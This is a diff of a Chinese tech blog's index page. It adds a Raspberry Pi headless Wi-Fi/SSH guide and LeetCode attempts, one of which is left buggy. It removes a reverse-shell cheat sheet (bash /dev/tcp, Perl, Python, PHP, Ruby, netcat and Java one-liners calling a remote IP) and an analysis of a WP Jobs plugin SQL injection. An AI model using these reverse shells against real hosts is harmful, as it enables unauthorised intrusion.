@@ -151,6 +151,98 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-没有外设配置树莓派Wi-Fi和SSH" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/18/没有外设配置树莓派Wi-Fi和SSH/">没有外设配置树莓派Wi-Fi和SSH</a>
+    </h1>
+  
+
+        
+        <a href="/2018/06/18/没有外设配置树莓派Wi-Fi和SSH/" class="archive-article-date">
+  	<time datetime="2018-06-18T04:37:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前每次使用<code>Raspberry</code>，通过<code>Win32DiskImage</code>将系统写入<code>SD卡</code>后。总是需要使用外设配置网络和远程连接。外设仅仅在第一次使用的时候需要用到，之后就不再需要，这是很大程度上浪费资源。</p>
+<p>在<code>Raspberry 3B</code>发布后不久，官方<code>Raspbian</code>系统加入了开机前对<code>Wi-Fi</code>网络的配置。方便了重新刷系统之后配置网络的操作。一般配置后的IP都是动态分配的，要获取设备的真正的ip可以通过无线路由器的后台获取，也可以使用nmap扫描子网获取。</p>
+<h2 id="0x01-配置Wi-Fi网络"><a href="#0x01-配置Wi-Fi网络" class="headerlink" title="0x01 配置Wi-Fi网络"></a>0x01 配置Wi-Fi网络</h2><p><code>SD卡</code>写入镜像后，在未启动<code>Raspberry</code>的状态下修改<code>/boot/wpa_supplicant.conf</code>配置文件的<code>Wi-Fi</code>的<code>SSID</code>和密码，通电后，就会读取该配置文件并连接<code>Wi-Fi</code>设备。若该目录下没有<code>wpa_supplicant.conf</code>配置文件，新建<code>wpa_supplicant.conf</code>文件，按照以下格式填写内容并保存<code>wpa_supplicant.conf</code>文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">country=CN</div><div class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class="line">update_config=1</div><div class="line"> </div><div class="line">network=&#123;</div><div class="line">ssid=&quot;WiFi-A&quot;</div><div class="line">psk=&quot;12345678&quot;</div><div class="line">key_mgmt=WPA-PSK</div><div class="line">priority=1</div><div class="line">&#125;</div><div class="line"> </div><div class="line">network=&#123;</div><div class="line">ssid=&quot;WiFi-B&quot;</div><div class="line">psk=&quot;12345678&quot;</div><div class="line">key_mgmt=WPA-PSK</div><div class="line">priority=2</div><div class="line">scan_ssid=1</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>参数介绍：</p>
+<p><strong>ssid：</strong>网络的ssid</p>
+<p><strong>psk：</strong>密码</p>
+<p><strong>priority：</strong>连接优先级，数字越大优先级越高(参数值大于等于0)</p>
+<p><strong>scan_ssid：</strong>连接隐藏WiFi时需要指定该值为1</p>
+<h2 id="0x02-Wi-Fi配置demo"><a href="#0x02-Wi-Fi配置demo" class="headerlink" title="0x02 Wi-Fi配置demo"></a>0x02 Wi-Fi配置demo</h2><p><strong>无WiFi密码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">network=&#123;</div><div class="line">ssid=&quot;你的无线网络名称（ssid）&quot;</div><div class="line">key_mgmt=NONE</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>使用WEP加密</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">network=&#123;</div><div class="line">ssid=&quot;你的无线网络名称（ssid）&quot;</div><div class="line">key_mgmt=NONE</div><div class="line">wep_key0=&quot;你的wifi密码&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>使用WPA/WPA2加密</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">network=&#123;</div><div class="line">ssid=&quot;你的无线网络名称（ssid）&quot;</div><div class="line">key_mgmt=WPA-PSK</div><div class="line">psk=&quot;你的wifi密码&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>技巧</strong></p>
+<p>如果不清楚Wi-Fi的加密模式，首先让手机连接上<code>Wi-Fi</code>，然后可以使用<code>Andriod</code>手机应用<code>root explorer</code>打开/data/misc/wifi/wpa/wpa_supplicant.conf，查看<code>Wi-Fi</code>信息。</p>
+<h2 id="0x03-开启SSH服务"><a href="#0x03-开启SSH服务" class="headerlink" title="0x03 开启SSH服务"></a>0x03 开启SSH服务</h2><p>自<code>2016-11</code>官方发布的<code>Raspbian</code>系统镜像后，系统默认禁用了<code>SSH</code>服务。重新开启只需要进入根目录下，新建一个名为<code>ssh</code>空白文件就可以了。</p>
+<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html" target="_blank" rel="external">无屏幕和键盘配置树莓派WiFi和SSH</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">树莓派</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/06/18/没有外设配置树莓派Wi-Fi和SSH/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-PHP集成环境默认配置之disable-function" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -305,6 +397,70 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/05/13/PHP集成环境默认配置之disable-function/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-LeetCode刷题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="LeetCode刷题"><a href="#LeetCode刷题" class="headerlink" title="LeetCode刷题"></a>LeetCode刷题</h2><h3 id="0x01-从排序数组中删除重复项"><a href="#0x01-从排序数组中删除重复项" class="headerlink" title="0x01 从排序数组中删除重复项"></a>0x01 从排序数组中删除重复项</h3><p>描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">给定一个排序数组，你需要在原地删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。</div><div class="line">不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。</div></pre></td></tr></table></figure></p>
+<p>第一次解题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">class Solution:</div><div class="line">    def removeDuplicates(self, nums):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        &quot;&quot;</div><div class="line">        i = 0</div><div class="line">        while(i&lt;len(nums)-1):</div><div class="line">            if(nums[i]!=nums[i+1]):</div><div class="line">                i += 1</div><div class="line">            else:</div><div class="line">                del(nums[i+1])</div><div class="line">        return len(nums)</div></pre></td></tr></table></figure>
+<p>不足之处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对于参数nums没有进行判断是否是空数组</div></pre></td></tr></table></figure>
+<p>第二次解题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class Solution:</div><div class="line">    def removeDuplicates(self, nums):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        i = 0</div><div class="line">        if(len(nums) == 0):</div><div class="line">            return 0</div><div class="line">        while(i &lt; len(nums) - 1):</div><div class="line">            if(nums[i] != nums[i+1]):</div><div class="line">                i += 1</div><div class="line">            else:</div><div class="line">                del(nums[i+1])</div><div class="line">        return len(nums)</div></pre></td></tr></table></figure>
+<p>不足之处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">此处删除元素使用了del函数。</div></pre></td></tr></table></figure>
+<p>第三次解题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">class Solution:</div><div class="line">    def removeDuplicates(self, nums):</div><div class="line">        i = 1</div><div class="line">        if(len(nums) == 0):</div><div class="line">            return 0</div><div class="line">        j = 1</div><div class="line">        while(j &lt; len(nums)):</div><div class="line">            if(nums[i] == nums[i-1]):</div><div class="line">                i += 1</div><div class="line">            else:</div><div class="line">                nums[j] = nums[i]</div><div class="line">                j += 1</div><div class="line">                i += 1</div><div class="line">        return j</div></pre></td></tr></table></figure>
+<p>不足之处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i += 1代码冗余了，不优雅。</div></pre></td></tr></table></figure>
+<p>第四次做题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class Solution:</div><div class="line">    def removeDuplicates(self, nums):</div><div class="line">        i = 1</div><div class="line">        j = 1</div><div class="line">        if(len(nums) == 0):</div><div class="line">            return 0</div><div class="line">        while(i&lt;len(nums)):</div><div class="line">            if(nums[i] != nums[i-1]):</div><div class="line">                nums[j] = nums[i]</div><div class="line">                j += 1</div><div class="line">            i += 1</div><div class="line">        return j</div></pre></td></tr></table></figure>
+<h3 id="0x02-买卖股票的最佳时机-II"><a href="#0x02-买卖股票的最佳时机-II" class="headerlink" title="0x02 买卖股票的最佳时机 II"></a>0x02 买卖股票的最佳时机 II</h3><p>描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</div><div class="line">设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</div><div class="line">注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</div></pre></td></tr></table></figure></p>
+<p>第一次解题：(贪心算法)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class Solution:</div><div class="line">    def maxProfit(self, prices):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        :type prices: List[int]</div><div class="line">        :rtype: int</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        max = 0</div><div class="line">        i = 1</div><div class="line">        if(len(prices) == 0):</div><div class="line">            return 0</div><div class="line">        while(i &lt; len(prices)):</div><div class="line">            if((prices[i] - prices[i-1]) &gt; 0):</div><div class="line">                max = prices[i] - prices[i-1]</div><div class="line">            i += 1</div><div class="line">        return max</div></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/05/04/LeetCode刷题/">展开全文 >></a>
         </p>
       
 
@@ -1004,195 +1160,6 @@
 
 
   
-    <article id="post-不会这几条命令，如何内网搅屎" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/23/不会这几条命令，如何内网搅屎/">不会这几条命令，如何内网搅屎</a>
-    </h1>
-  
-
-        
-        <a href="/2017/09/23/不会这几条命令，如何内网搅屎/" class="archive-article-date">
-  	<time datetime="2017-09-23T08:25:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上11点的时候，学长跟我说<code>Python</code>的官网的在线<code>shell</code>存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在<code>Python</code>官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。</p>
-<p>这篇文章当然不是来讲<code>Python</code>网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的<code>Linux下反弹shell的方法</code>。</p>
-<h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h2><p>愚人废话在多说一点，毕竟要反弹shell，所以远程主机上一定要有一些工具或者脚本才能完成这个流程。如果没有这些工具或者脚本，在一些可能的情况下，依然可以将其上传到远程主机上。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kali 2.0 — 2017/2</div><div class="line">Debian 7.0x64</div></pre></td></tr></table></figure>
-<h2 id="0x02-常用的工具及脚本"><a href="#0x02-常用的工具及脚本" class="headerlink" title="0x02 常用的工具及脚本"></a>0x02 常用的工具及脚本</h2><p>控制端主机：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 1234 -vvv</div></pre></td></tr></table></figure>
-<p><strong>Bash</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/&lt;Target_IP&gt;/&lt;Port&gt; 0&gt;&amp;1</div></pre></td></tr></table></figure>
-<p><strong>Perl</strong></p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use </span></div><div class="line"><span class="string">Socket;$i="&lt;Target_IP&gt;";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))</span></div><div class="line"><span class="string">&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
-<p><strong>Python</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Target_IP&gt;",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div></pre></td></tr></table></figure>
-<p><strong>PHP</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("&lt;Target_IP&gt;",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
-<p><strong>Ruby</strong></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Target_IP&gt;",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></div></pre></td></tr></table></figure>
-<p>Ruby这个测试了多次一直没有成功。</p>
-<p><strong>NetCat</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh &lt;Target_IP&gt; 1234</div></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;Target_IP&gt; 1234 &gt;/tmp/f</div></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc &lt;Target_IP&gt; 8888|/bin/sh|nc &lt;Target_IP&gt; 9999</div></pre></td></tr></table></figure>
-<p><strong>Java</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.8.31/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
-<p>java版本的，我也没测试成功。本人太愚。</p>
-<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">Linux下反弹shell方法</a><br><a href="http://www.linuxidc.com/Linux/2016-11/136993.htm" target="_blank" rel="external">Linux里的2&gt;&amp;1究竟是什么</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/09/23/不会这几条命令，如何内网搅屎/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CVE-2017-9603-分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/18/CVE-2017-9603-分析/">CVE-2017-9603 分析</a>
-    </h1>
-  
-
-        
-        <a href="/2017/09/18/CVE-2017-9603-分析/" class="archive-article-date">
-  	<time datetime="2017-09-18T05:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>突然有一种冲动想挖个CVE，然后在CVE官网上找到了一个<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9603" target="_blank" rel="external">CVE-2017-9603</a>，开始分析了一波，然后在找些无人区弄个CVE。┑(￣▽ ￣)┍</p>
-<h3 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h3><ol>
-<li>phpstudy</li>
-<li>wordpress/4.8.1/zh-CN</li>
-<li>WP jobs 1.4~1.5</li>
-</ol>
-<h3 id="0x02-描述"><a href="#0x02-描述" class="headerlink" title="0x02 描述"></a>0x02 描述</h3><p>wordpress 中WP Jobs插件版本低于1.5存在经过验证的用户可以通过<code>wp-admin/edit.php</code>页面中的<code>jobid</code>参数执行任意的SQL命令。</p>
-<h3 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h3><p>漏洞的发生位置在<code>wp-jobs\wpjobs_applications.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$job_id = $_REQUEST[<span class="string">'jobid'</span>];  <span class="comment">#在未过滤的情况下获取参数jobid</span></div><div class="line">$jb_args = <span class="keyword">array</span>(</div><div class="line">    <span class="string">'posts_per_page'</span> =&gt; <span class="number">-1</span>,</div><div class="line">    <span class="string">'orderby'</span> =&gt; <span class="string">'post_date'</span>,</div><div class="line">    <span class="string">'order'</span> =&gt; <span class="string">'DESC'</span>,</div><div class="line">    <span class="string">'post_type'</span> =&gt; <span class="string">'job'</span>,</div><div class="line">    <span class="string">'post_status'</span> =&gt; <span class="string">'publish'</span>,</div><div class="line">    <span class="string">'suppress_filters'</span> =&gt; <span class="keyword">true</span>);</div><div class="line"></div><div class="line">$jobs = get_posts($jb_args);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;form autocomplete=<span class="string">"off"</span> name=<span class="string">"form"</span> id=<span class="string">"form"</span>&gt;</div><div class="line">    <span class="meta">&lt;?php</span> _e(<span class="string">'Filter by Job'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span> &lt;select name=<span class="string">"jumpMenu"</span> id=<span class="string">"jumpMenu"</span> onchange=<span class="string">"MM_jumpMenu('parent', this, 0)"</span>&gt;</div><div class="line">        &lt;option value=<span class="string">"edit.php?post_type=job&amp;page=WPJobsJobApps"</span>&gt;All Applications&lt;/option&gt;</div><div class="line">        <span class="meta">&lt;?php</span> <span class="keyword">foreach</span> ($jobs <span class="keyword">as</span> $job_info) : setup_postdata($jobs); <span class="meta">?&gt;</span></div><div class="line">            &lt;option <span class="meta">&lt;?php</span></div><div class="line">            <span class="keyword">if</span> ($job_info-&gt;ID == $job_id) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'selected="selected"'</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="meta">?&gt;</span> value=<span class="string">"edit.php?post_type=job&amp;page=WPJobsJobApps&amp;jobid=&lt;?php echo $job_info-&gt;ID; ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $job_info-&gt;post_title; <span class="meta">?&gt;</span>&lt;/option&gt;</div><div class="line">                <span class="meta">&lt;?php</span></div><div class="line">            <span class="keyword">endforeach</span>;</div><div class="line">            wp_reset_postdata();</div><div class="line">            <span class="meta">?&gt;</span></div><div class="line">    &lt;/select&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;style&gt;</div><div class="line">    .dctrprt tr th, .dctrprt tr td &#123;</div><div class="line">        font-family:Arial, Helvetica, sans-serif;</div><div class="line">        font-size:<span class="number">13</span>px;</div><div class="line">    &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;table class="widefat dctrprt"&gt;</div><div class="line">    &lt;tr&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'S.No'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Job Title'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Full Name'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Email'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Phone Number'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Download Resume'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">    &lt;/tr&gt;</div><div class="line">    <span class="meta">&lt;?php</span></div><div class="line">    $tbl = $wpdb-&gt;prefix;</div><div class="line">    $qry = <span class="string">"Select * from "</span> . $tbl . <span class="string">"app_user_info "</span>;</div><div class="line">    <span class="keyword">if</span> ($job_id &lt;&gt; <span class="string">""</span>) &#123;</div><div class="line">        $qry .= <span class="string">" where app_job_id = "</span> . $job_id;   <span class="comment">##$job_id参数拼接SQL语句</span></div><div class="line">    &#125;</div><div class="line">    $qry .= <span class="string">" Order by `app_id` Desc "</span>;</div><div class="line">    $users = $wpdb-&gt;get_results($qry);</div><div class="line">    $i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user) &#123;</div><div class="line">        <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>代码第十行，获取了没有过滤的的<code>$_REQUEST[&#39;jobid&#39;]</code>的变量，然后在代码56行进行了<code>SQL语句</code>拼接。且拼接的唯一要求就是<code>$job_id &lt;&gt; &quot;&quot;</code>。只要$job_id有值就可以完成拼接。</p>
-<h3 id="0x04-验证想法"><a href="#0x04-验证想法" class="headerlink" title="0x04 验证想法"></a>0x04 验证想法</h3><p><strong>测试如下：</strong></p>
-<img src="/2017/09/18/CVE-2017-9603-分析/1.png" alt="ByPupil" title="ByPupil">
